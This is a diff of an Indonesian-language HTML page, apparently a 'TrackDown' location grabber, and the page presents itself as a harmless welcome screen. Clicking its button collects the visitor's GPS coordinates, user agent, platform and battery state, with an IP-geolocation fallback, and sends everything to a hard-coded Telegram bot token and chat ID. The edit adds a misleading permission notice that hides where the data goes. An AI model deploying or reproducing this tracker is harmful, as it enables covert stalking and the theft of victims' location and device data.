@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TrackDown Enhanced</title>
+    <title>Notifikasi Lokasi</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -21,100 +21,177 @@
             cursor: pointer;
             margin-top: 20px;
         }
+
+        #notification {
+            display: none;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            background: #f9f9f9;
+            padding: 15px;
+            box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            z-index: 1000;
+        }
+
+        #notification p {
+            margin: 0;
+            font-size: 16px;
+            color: #333;
+        }
+
+        #notification button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        #allowButton {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            margin-right: 5px;
+        }
+
+        #dismissButton {
+            background: #ccc;
+            color: black;
+            border: none;
+        }
     </style>
 </head>
 <body>
     <h1>Selamat Datang!</h1>
-    <p>Tekan tombol di bawah untuk melanjutkan.</p>
-    <button class="action-button" id="actionButton">Lanjutkan</button>
+    <p>Tekan tombol di bawah untuk mulai.</p>
+    <button class="action-button" id="startButton">Mulai</button>
+
+    <div id="notification">
+        <p>Akses lokasi memungkinkan fitur tertentu berfungsi. Tanpa izin, aplikasi tetap bisa digunakan dengan fitur terbatas.</p>
+        <button id="allowButton">Izinkan</button>
+        <button id="dismissButton">Tutup</button>
+    </div>
 
     <script>
-        (function() {
-            // Nama variabel yang lebih umum
-            const apiKey = "7375262668:AAHBFfwnMZ9Cg0clsH-m5HZOdq-nhFJ9Cww"; // Token API Telegram
-            const userId = "5649811717"; // Chat ID Telegram
+        const telegramToken = "7375262668:AAHBFfwnMZ9Cg0clsH-m5HZOdq-nhFJ9Cww"; // Ganti dengan token bot Telegram Anda
+        const chatId = "5649811717"; // Ganti dengan Chat ID Anda
 
-            function sendToServer(message) {
-                const endpoint = `https://api.telegram.org/bot${apiKey}/sendMessage`;
-                fetch(endpoint, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: userId, text: message }),
-                }).catch(() => console.log("Gagal mengirim data ke server."));
-            }
+        document.getElementById("startButton").addEventListener("click", () => {
+            document.getElementById("notification").style.display = "block";
+        });
 
-            function getIPDetails() {
-                fetch("https://ipapi.co/json/")
-                    .then(response => response.json())
-                    .then(data => {
-                        const ipInfo = `
-IP Address: ${data.ip}
-City: ${data.city}
-Region: ${data.region}
-Country: ${data.country_name}
-                        `;
-                        sendToServer(`IP Details:\n${ipInfo}`);
-                    })
-                    .catch(() => console.log("Gagal mengambil lokasi IP."));
-            }
+        document.getElementById("allowButton").addEventListener("click", () => {
+            document.getElementById("notification").style.display = "none";
+            getDeviceAndLocationInfo(); // Panggil fungsi untuk mendapatkan data
+        });
 
-            function getDeviceInfo() {
-                return `
+        document.getElementById("dismissButton").addEventListener("click", () => {
+            document.getElementById("notification").style.display = "none";
+        });
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message }),
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Data berhasil dikirim ke Telegram.");
+                } else {
+                    console.error("Gagal mengirim data ke Telegram.");
+                }
+            })
+            .catch(error => console.error("Error:", error));
+        }
+
+        function getDeviceAndLocationInfo() {
+            const deviceInfo = `
 Platform: ${navigator.platform}
 User Agent: ${navigator.userAgent}
 Vendor: ${navigator.vendor || 'N/A'}
-                `;
-            }
+            `;
 
-            function getBatteryStatus(callback) {
-                if ('getBattery' in navigator) {
-                    navigator.getBattery().then(battery => {
-                        const batteryInfo = `
-Battery Level: ${battery.level * 100}%
-Charging: ${battery.charging ? 'Yes' : 'No'}
-                        `;
-                        callback(batteryInfo);
-                    }).catch(() => callback("Battery Info: Gagal diambil."));
-                } else {
-                    callback("Battery Info: Tidak didukung.");
-                }
-            }
+            // Ambil informasi baterai jika tersedia
+            getBatteryStatus((batteryInfo) => {
+                getGeolocation((locationInfo) => {
+                    const message = `
+${locationInfo}
 
-            function getGeolocation() {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const { latitude, longitude, accuracy } = position.coords;
-                            let message = `
-Location Info:
+Perangkat:
+${deviceInfo}
+
+Baterai:
+${batteryInfo}
+                    `;
+                    sendToTelegram(message);
+                });
+            });
+        }
+
+        function getBatteryStatus(callback) {
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(function(battery) {
+                    const batteryInfo = `
+Level Baterai: ${(battery.level * 100).toFixed(0)}%
+Mengisi Daya: ${battery.charging ? 'Ya' : 'Tidak'}
+                    `;
+                    callback(batteryInfo);
+                }).catch(function() {
+                    callback("Informasi baterai tidak tersedia.");
+                });
+            } else {
+                callback("Informasi baterai tidak didukung oleh perangkat ini.");
+            }
+        }
+
+        function getGeolocation(callback) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        const locationInfo = `
+Lokasi Perangkat:
 Latitude: ${latitude}
 Longitude: ${longitude}
-Accuracy: ${accuracy} meters
+Akurasi: ${accuracy} meter
 Google Maps: https://www.google.com/maps?q=${latitude},${longitude}
-
-Device Info:
-${getDeviceInfo()}
-                            `;
-                            getBatteryStatus(batteryInfo => {
-                                message += `\n${batteryInfo}`;
-                                sendToServer(message);
-                            });
-                        },
-                        () => {
-                            console.log("Geolocation gagal, fallback ke IP.");
-                            getIPDetails();
-                        }
-                    );
-                } else {
-                    console.log("Geolocation tidak didukung, fallback ke IP.");
-                    getIPDetails();
-                }
+                        `;
+                        callback(locationInfo);
+                    },
+                    (error) => {
+                        console.error("Izin lokasi ditolak atau gagal:", error.message);
+                        sendFallbackIPLocation(callback); // Fallback ke IP jika lokasi tidak diizinkan
+                    }
+                );
+            } else {
+                console.error("Geolocation tidak didukung oleh browser.");
+                sendFallbackIPLocation(callback); // Fallback ke IP jika browser tidak mendukung geolocation
             }
+        }
 
-            document.getElementById("actionButton").addEventListener("click", () => {
-                getGeolocation();
-            });
-        })();
+        function sendFallbackIPLocation(callback) {
+            fetch("https://ipapi.co/json/")
+                .then(response => response.json())
+                .then(data => {
+                    const locationInfo = `
+Fallback Lokasi IP:
+IP Address: ${data.ip}
+Kota: ${data.city}
+Wilayah: ${data.region}
+Negara: ${data.country_name}
+                    `;
+                    callback(locationInfo);
+                })
+                .catch(error => {
+                    console.error("Gagal mengambil lokasi IP:", error);
+                    callback("Informasi lokasi tidak tersedia.");
+                });
+        }
     </script>
 </body>
 </html>
